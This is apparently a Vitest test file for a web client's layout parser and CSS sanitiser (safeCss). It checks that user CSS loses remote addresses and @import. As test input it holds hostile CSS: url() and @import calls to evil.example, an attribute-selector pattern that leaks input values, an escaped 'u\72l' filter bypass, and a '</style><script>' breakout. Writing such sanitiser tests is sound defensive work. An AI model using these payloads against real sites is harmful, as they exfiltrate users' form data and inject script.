/** 界面 (client/ui.ts): a stored layout is taken only as far as it is well-formed, and your CSS cannot phone home. */
import { describe, expect, it } from 'vitest';
import { BASE_WIDGETS, CSS_MAX, parseLayout, safeCss } from '../client/ui';
import { CLIENT_FEATURES } from '../client/features';

describe('界面 layout', () => {
  it('keeps the well-formed parts of a stored layout', () => {
    expect(parseLayout(null)).toEqual({ theme: 'parchment', off: [], at: {}, css: '' });
    const l = parseLayout({ theme: 'night', off: ['feed', 7, 'bad id!'], at: { minimap: [10.4, -20], feed: [1], x: [NaN, 0], hotbar: [1e9, 0] }, css: 'x'.repeat(CSS_MAX + 5) });
    expect(l.theme).toBe('night');
    expect(l.off).toEqual(['feed']);
    expect(l.at).toEqual({ minimap: [10, -20], hotbar: [4000, 0] });
    expect(l.css.length).toBe(CSS_MAX);
    expect(parseLayout({ theme: 'neon' }).theme).toBe('parchment');
  });

  it('your CSS keeps data: and same-origin urls, loses remote ones and @import', () => {
    const out = safeCss(`@import 'https://evil.example/x.css';
      input[value^="a"] { background: url(https://evil.example/?a) }
      #me { background: url( "//evil.example/b" ) }
      #goal { background: u\\72l(https://evil.example/c) } #bars { background: image-set("https://evil.example/d" 1x) }
      #feed { background: url(data:image/png;base64,AAAA) } #clock { background: url('/ui/edge.svg') } </style><script>`);
    expect(out).not.toMatch(/(url|image-set|src)\([^)]*evil/i); // what is left of an address is plain text
    expect(out).not.toMatch(/@import/);
    expect(out).toContain('url(data:image/png;base64,AAAA)');
    expect(out).toContain("url('/ui/edge.svg')");
    expect(out).not.toMatch(/<\/style/i);
  });

  it('widget ids are unique across main.ts and the features, and the 界面 feature is registered', () => {
    expect(CLIENT_FEATURES.some(([key, f]) => key === 'ui' && f.name === 'uiFeature')).toBe(true);
    const ids = BASE_WIDGETS.map((w) => w.id);
    expect(new Set(ids).size).toBe(ids.length);
  });
});
